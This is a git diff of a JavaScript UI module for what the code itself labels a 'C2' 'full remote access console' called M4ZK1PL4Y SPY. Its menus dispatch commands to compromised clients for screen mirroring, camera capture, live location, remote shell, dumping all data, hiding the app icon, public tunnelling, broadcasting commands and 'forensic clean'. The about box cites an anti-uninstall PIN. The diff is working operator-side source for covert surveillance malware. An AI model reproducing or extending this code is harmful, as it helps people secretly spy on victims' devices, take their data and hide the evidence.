@@ -1,7 +1,7 @@
-/* chrome: titlebar + menubar + toolbar + statusbar + ripple + ctx menu */
-import { $, $$, esc, fmt, clock, toast, api } from './core.js';
+/* chrome, ikon, ripple, modal, ctx menu */
+import { $, $$, esc, clock, api } from './core.js';
 
-const I = {
+const P = {
   dash: 'M3 3h7v7H3zM14 3h7v5h-7zM14 12h7v9h-7zM3 14h7v7H3z',
   clients: 'M4 5h16v11H4zM8 20h8M12 16v4',
   qr: 'M3 3h6v6H3zM15 3h6v6h-6zM3 15h6v6H3zM15 15h2v2h-2zM19 15h2v2h-2zM15 19h2v2h-2zM19 19h2v2h-2z',
@@ -22,30 +22,27 @@ const I = {
   reload: 'M20 12a8 8 0 1 1-2.3-5.6M20 4v5h-5',
   info: 'M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18zM12 8h.01M11 12h1v5',
   logout: 'M14 4H5v16h9M17 8l4 4-4 4M21 12h-9',
-  copy: 'M9 9h11v11H9zM4 15V4h11',
   bolt: 'M13 2L5 14h6l-1 8 8-12h-6z',
   gear: 'M12 9a3 3 0 1 0 0 6 3 3 0 0 0 0-6M12 2v3M12 19v3M2 12h3M19 12h3M5 5l2 2M17 17l2 2M19 5l-2 2M7 17l-2 2',
   wipe: 'M4 7h16M9 7V4h6v3M6 7l1 13h10l1-13',
-  app: 'M4 4h7v7H4zM13 4h7v7h-7zM4 13h7v7H4zM13 13h7v7h-7z',
   file: 'M6 3h8l4 4v14H6zM14 3v4h4',
-  lock: 'M6 10h12v10H6zM9 10V7a3 3 0 0 1 6 0v3',
-  net: 'M12 3v18M5 8h14M5 16h14',
-  battery: 'M3 8h15v8H3zM20 11v2',
-  term: 'M3 4h18v16H3zM7 9l2 2-2 2M12 13h5',
   clock: 'M12 3a9 9 0 1 0 0 18 9 9 0 0 0 0-18zM12 7v5l4 2',
+  term: 'M3 4h18v16H3zM7 9l2 2-2 2M12 13h5',
+  app: 'M4 4h7v7H4zM13 4h7v7h-7zM4 13h7v7H4zM13 13h7v7h-7z',
+  net: 'M12 3v18M5 8h14M5 16h14',
+  lock: 'M6 10h12v10H6zM9 10V7a3 3 0 0 1 6 0v3',
 };
 
-export const svg = (n, cls = '') =>
-  `<svg class="${cls}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7"
-    stroke-linecap="round" stroke-linejoin="round"><path d="${I[n] || I.info}"/></svg>`;
+export const svg = (n) =>
+  '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" ' +
+  'stroke-linecap="round" stroke-linejoin="round"><path d="' + (P[n] || P.info) + '"/></svg>';
 
-/* ripple gelap di semua elemen interaktif */
 export function rippleInit(root = document) {
   root.addEventListener('pointerdown', (e) => {
-    const t = e.target.closest('.btn,.chip,.tbtn,.tab,.mb-item,.pcard,.nav-i,.card');
+    const t = e.target.closest('.btn,.chip,.tbtn,.tab,.mb-item,.pcard,.card');
     if (!t) return;
     const r = t.getBoundingClientRect();
-    const d = Math.max(r.width, r.height);
+    const d = Math.max(r.width, r.height) || 10;
     const s = document.createElement('span');
     s.className = 'rip';
     s.style.width = s.style.height = d + 'px';
@@ -56,73 +53,65 @@ export function rippleInit(root = document) {
   }, { passive: true });
 }
 
-const PAGES = [
+const NAV = [
   ['dashboard', 'Overview', 'dash'], ['targets', 'Clients', 'clients'],
-  ['pair', 'Pairing QR', 'qr'], ['build', 'Build', 'build'],
+  ['pair', 'Pairing', 'qr'], ['build', 'Build', 'build'],
   ['dumps', 'Dumps', 'dumps'], ['admin', 'Admin', 'admin'],
 ];
 
-export const CMDS = {
-  ping: 'Ping target', screen: 'Mirror layar', cam: 'Kamera', loc: 'Lokasi live',
-  dumpall: 'Dump semua', shell: 'Shell', reboot: 'Reboot', hide: 'Sembunyikan ikon',
-  kill: 'Matikan agent', tunnel: 'Tunnel publik', broadcast: 'Broadcast perintah',
-  forensic: 'Forensic clean',
-};
-
 export function chrome(win, opt = {}) {
   const page = opt.page || 'dashboard';
-  const title = opt.title || 'M4ZK1PL4Y';
+  const title = opt.title || 'Console';
   const actions = opt.actions || [];
+  const nav = NAV.map(([p, l, i]) =>
+    '<button data-page="' + p + '"' + (p === page ? ' style="color:var(--acc)"' : '') + '>' +
+    svg(i) + l + '</button>').join('');
 
-  const navItems = PAGES.map(([p, l, ic]) =>
-    `<button data-page="${p}">${svg(ic)}${l}</button>`).join('');
-
-  const cmdBtn = (k, extra = '') =>
-    `<button data-cmd="${k}" class="${extra}">${svg(k === 'dumpall' ? 'dump' : k)}${CMDS[k]}</button>`;
-
-  win.innerHTML = `
-  <div class="titlebar">
-    <div class="tb-brand"><img src="/static/img/garuda.svg" alt=""><b>M4ZK1PL4Y</b><span>SPY</span></div>
-    <div class="tb-path">C2 \\ ${esc(title.toUpperCase())}</div>
-    <div class="tb-right">
-      <span class="tb-chip on"><i class="led on"></i><span id="tbOn">0</span> ONLINE</span>
-      <span class="tb-chip" id="tbPub">LOCAL</span>
-      <div class="tb-win"><i></i><i></i><i></i></div>
-    </div>
-  </div>
-  <div class="menubar">
-    <div class="mb-item" data-menu>FILE<div class="mb-drop">
-      ${navItems}
-      <div class="sep"></div>
-      <button data-act="logout">${svg('logout')}Keluar</button>
-    </div></div>
-    <div class="mb-item" data-menu>CLIENT<div class="mb-drop">
-      ${cmdBtn('ping')}${cmdBtn('screen')}${cmdBtn('cam')}${cmdBtn('loc')}
-      <div class="sep"></div>${cmdBtn('shell')}${cmdBtn('dumpall')}${cmdBtn('hide')}
-    </div></div>
-    <div class="mb-item" data-menu>TOOLS<div class="mb-drop">
-      ${cmdBtn('tunnel')}${cmdBtn('broadcast')}${cmdBtn('forensic')}
-      <div class="sep"></div><button data-act="reload">${svg('reload')}Muat ulang</button>
-    </div></div>
-    <div class="mb-item" data-menu>HELP<div class="mb-drop">
-      <button data-act="about">${svg('info')}Tentang</button>
-      <button data-act="docs">${svg('file')}API docs</button>
-    </div></div>
-    <div class="spacer"></div>
-    <div class="mb-item" id="mbClock" style="cursor:default">--:--:--</div>
-  </div>
-  <div class="toolbar">${actions.map((a) => a.html).join('')}
-    <div class="spacer"></div>
-    <span class="tb-chip" id="tbSess">SESI AKTIF</span>
-  </div>`;
+  win.innerHTML =
+    '<div class="titlebar">' +
+      '<div class="tb-brand"><img src="/static/img/garuda.svg" alt=""><b>M4ZK1PL4Y</b><span>SPY</span></div>' +
+      '<div class="tb-path">C2 \\ ' + esc(title.toUpperCase()) + '</div>' +
+      '<div class="tb-right">' +
+        '<span class="tb-chip on"><i class="led on"></i><span id="tbOn">0</span> ONLINE</span>' +
+        '<span class="tb-chip" id="tbPub">LOCAL</span>' +
+        '<div class="tb-win"><i></i><i></i><i></i></div>' +
+      '</div>' +
+    '</div>' +
+    '<div class="menubar">' +
+      '<div class="mb-item" data-menu>FILE<div class="mb-drop">' + nav +
+        '<div class="sep"></div><button data-act="logout">' + svg('logout') + 'Keluar</button></div></div>' +
+      '<div class="mb-item" data-menu>CLIENT<div class="mb-drop">' +
+        '<button data-cmd="ping">' + svg('ping') + 'Ping</button>' +
+        '<button data-cmd="screen_start">' + svg('screen') + 'Mirror</button>' +
+        '<button data-cmd="cam_front">' + svg('cam') + 'Kamera</button>' +
+        '<button data-cmd="locate_start">' + svg('loc') + 'Lokasi</button>' +
+        '<div class="sep"></div>' +
+        '<button data-cmd="shell">' + svg('shell') + 'Shell</button>' +
+        '<button data-cmd="dumpall">' + svg('dump') + 'Dump semua</button>' +
+        '<button data-cmd="hide_icon">' + svg('hide') + 'Sembunyikan</button>' +
+        '<div class="sep"></div>' +
+        '<button data-cmd="kill_self" class="danger">' + svg('kill') + 'Matikan agent</button></div></div>' +
+      '<div class="mb-item" data-menu>TOOLS<div class="mb-drop">' +
+        '<button data-cmd="tunnel">' + svg('tunnel') + 'Tunnel publik</button>' +
+        '<button data-cmd="broadcast">' + svg('bolt') + 'Broadcast</button>' +
+        '<button data-cmd="forensic">' + svg('wipe') + 'Forensic clean</button>' +
+        '<div class="sep"></div><button data-act="reload">' + svg('reload') + 'Muat ulang</button></div></div>' +
+      '<div class="mb-item" data-menu>HELP<div class="mb-drop">' +
+        '<button data-act="about">' + svg('info') + 'Tentang</button>' +
+        '<button data-act="docs">' + svg('file') + 'API docs</button></div></div>' +
+      '<div class="spacer"></div>' +
+      '<div class="mb-item" id="mbClock" style="cursor:default">--:--:--</div>' +
+    '</div>' +
+    '<div class="toolbar">' + actions.join('') +
+      '<div class="spacer"></div><span class="tb-chip" id="tbSess">SESI</span></div>';
 
   $$('.mb-item[data-menu]').forEach((m) => {
-    m.onclick = (e) => {
+    m.addEventListener('click', (e) => {
       e.stopPropagation();
       const was = m.classList.contains('open');
       $$('.mb-item').forEach((x) => x.classList.remove('open'));
       if (!was) m.classList.add('open');
-    };
+    });
   });
   document.addEventListener('click', () => $$('.mb-item').forEach((x) => x.classList.remove('open')));
 
@@ -132,20 +121,17 @@ export function chrome(win, opt = {}) {
     const cm = e.target.closest('[data-cmd]');
     if (cm) { window.dispatchEvent(new CustomEvent('mzk:cmd', { detail: cm.dataset.cmd })); return; }
     const ac = e.target.closest('[data-act]');
-    if (ac) {
-      const a = ac.dataset.act;
-      if (a === 'logout') logout();
-      else if (a === 'reload') location.reload();
-      else if (a === 'about') about();
-      else if (a === 'docs') window.open('/api/docs', '_blank');
-    }
+    if (!ac) return;
+    const a = ac.dataset.act;
+    if (a === 'logout') logout();
+    else if (a === 'reload') location.reload();
+    else if (a === 'about') about();
+    else if (a === 'docs') window.open('/api/docs', '_blank');
   });
 
   rippleInit(win);
   clock($('#mbClock'));
-  api('/api/targets').then((d) => {
-    const n = $('#tbOn'); if (n) n.textContent = d.stats.online;
-  }).catch(() => {});
+  api('/api/targets').then((d) => { const n = $('#tbOn'); if (n) n.textContent = d.stats.online; }).catch(() => {});
   api('/api/tunnel/status').then((s) => {
     const el = $('#tbPub');
     if (el && s.url) { el.textContent = 'TUNNEL'; el.classList.add('on'); }
@@ -154,40 +140,39 @@ export function chrome(win, opt = {}) {
 
 export async function logout() {
   try { await api('/api/logout', { method: 'POST' }); } catch {}
-  location.href = '/';
+  location.href = '/login';
 }
 
 export function about() {
   const m = document.createElement('div');
   m.className = 'mask on';
-  m.innerHTML = `<div class="dlg">
-    <div class="dlg-h">${svg('info')}M4ZK1PL4YSPY<span class="x">×</span></div>
-    <div class="dlg-b">
-      <b style="color:#fff">C2 · INJECTOR · WEB AGENT · TUNNEL</b><br>
-      v2.0.0 CRIMSON — full remote access console.<br>
-      License M4ZK1PL4Y · PIN anti-uninstall 211421.<br><br>
-      <span class="dim">Klik kanan pada baris client untuk menu cepat.</span>
-    </div>
-    <div class="dlg-f"><button class="btn acc" data-x>TUTUP</button></div></div>`;
+  m.innerHTML = '<div class="dlg"><div class="dlg-h">' + svg('info') +
+    'M4ZK1PL4YSPY<span class="x">&times;</span></div><div class="dlg-b">' +
+    '<b style="color:#fff">C2 &middot; INJECTOR &middot; WEB AGENT &middot; TUNNEL</b><br>' +
+    'v2.1.0 CRIMSON-VOID &mdash; full remote access console.<br>' +
+    'License M4ZK1PL4Y &middot; PIN anti-uninstall 211421.<br><br>' +
+    '<span class="dim">Klik kanan baris client untuk menu cepat.</span></div>' +
+    '<div class="dlg-f"><button class="btn acc" data-x>TUTUP</button></div></div>';
   document.body.appendChild(m);
-  m.onclick = (e) => { if (e.target === m || e.target.dataset.x !== undefined || e.target.className === 'x') m.remove(); };
+  m.addEventListener('click', (e) => {
+    if (e.target === m || e.target.dataset.x !== undefined || e.target.className === 'x') m.remove();
+  });
 }
 
 export function confirmBox(title, msg, danger = true) {
   return new Promise((res) => {
     const m = document.createElement('div');
     m.className = 'mask on';
-    m.innerHTML = `<div class="dlg">
-      <div class="dlg-h">${svg('bolt')}${esc(title)}<span class="x">×</span></div>
-      <div class="dlg-b">${esc(msg)}</div>
-      <div class="dlg-f"><button class="btn ghost" data-n>BATAL</button>
-      <button class="btn ${danger ? 'acc' : ''}" data-y>LANJUT</button></div></div>`;
+    m.innerHTML = '<div class="dlg"><div class="dlg-h">' + svg('bolt') + esc(title) +
+      '<span class="x">&times;</span></div><div class="dlg-b">' + esc(msg) + '</div>' +
+      '<div class="dlg-f"><button class="btn ghost" data-n>BATAL</button>' +
+      '<button class="btn ' + (danger ? 'acc' : '') + '" data-y>LANJUT</button></div></div>';
     document.body.appendChild(m);
     const done = (v) => { m.remove(); res(v); };
-    m.onclick = (e) => {
+    m.addEventListener('click', (e) => {
       if (e.target.dataset.y !== undefined) done(true);
       else if (e.target.dataset.n !== undefined || e.target === m || e.target.className === 'x') done(false);
-    };
+    });
   });
 }
 
@@ -195,25 +180,25 @@ export function ctxMenu(x, y, rows) {
   $$('.ctx').forEach((c) => c.remove());
   const m = document.createElement('div');
   m.className = 'ctx';
-  m.innerHTML = rows.map((r) => r === '-' ? '<div class="sep"></div>'
-    : `<button data-k="${r.k}" class="${r.danger ? 'danger' : ''}">${svg(r.i || 'bolt')}${r.l}</button>`).join('');
+  m.innerHTML = rows.map((r) => r === '-'
+    ? '<div class="sep"></div>'
+    : '<button data-k="' + r.k + '"' + (r.danger ? ' class="danger"' : '') + '>' +
+      svg(r.i || 'bolt') + r.l + '</button>').join('');
   document.body.appendChild(m);
-  const w = m.offsetWidth, h = m.offsetHeight;
-  m.style.left = Math.min(x, innerWidth - w - 6) + 'px';
-  m.style.top = Math.min(y, innerHeight - h - 6) + 'px';
-  m.onclick = (e) => {
+  m.style.left = Math.min(x, innerWidth - m.offsetWidth - 6) + 'px';
+  m.style.top = Math.min(y, innerHeight - m.offsetHeight - 6) + 'px';
+  m.addEventListener('click', (e) => {
     const b = e.target.closest('[data-k]');
     m.remove();
     if (b) window.dispatchEvent(new CustomEvent('mzk:cmd', { detail: b.dataset.k }));
-  };
+  });
   setTimeout(() => document.addEventListener('click', () => m.remove(), { once: true }), 10);
 }
 
-export function statusbar(win, el) {
+export function statusbar(win, html) {
   const sb = document.createElement('div');
   sb.className = 'statusbar';
-  sb.innerHTML = el || `<span class="st"><b>●</b> C2 READY</span>
-    <span class="st" id="stClk"></span><span class="st-r">v2.0.0</span>`;
+  sb.innerHTML = html || '<span class="st"><b>&#9679;</b> READY</span><span class="st-r">v2.1.0</span>';
   win.appendChild(sb);
   clock($('#stClk', sb));
   return sb;
